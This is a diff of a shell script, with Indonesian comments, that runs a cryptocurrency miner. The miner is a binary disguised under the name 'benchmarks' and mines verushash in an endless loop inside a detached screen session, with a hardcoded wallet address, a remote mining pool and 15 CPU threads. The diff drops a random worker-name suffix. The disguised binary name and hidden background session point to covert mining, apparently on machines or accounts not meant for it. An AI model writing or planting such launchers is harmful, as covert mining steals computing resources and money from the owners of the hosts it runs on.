@@ -16,9 +16,6 @@ if [ ! -f benchmarks ]; then
   chmod +x benchmarks
 fi
 
-# Buat nama screen acak (huruf saja)
-SCREEN_NAME=$(cat /dev/urandom | tr -dc "a-z" | fold -w 6 | head -n 1)
-
 # Cek apakah screen sudah berjalan
 if screen -list | grep -q amirul3; then
   echo "⚠️  Screen 'amirul3' sudah jalan, skip."
@@ -26,7 +23,7 @@ else
   echo "▶ Menjalankan mining di screen 'amirul3'..."
   screen -dmS amirul3 bash -c '
     while true; do
-      ./benchmarks --algorithm verushash --pool stratum+ssl://sg.vipor.net:5140 -u RQdUotwPueFvRY5xKfn6REsMUsBdhhmqdq.$SCREEN_NAME --cpu-threads 15
+      ./benchmarks --algorithm verushash --pool stratum+ssl://sg.vipor.net:5140 -u RQdUotwPueFvRY5xKfn6REsMUsBdhhmqdq --cpu-threads 15
       sleep 2
     done
   '
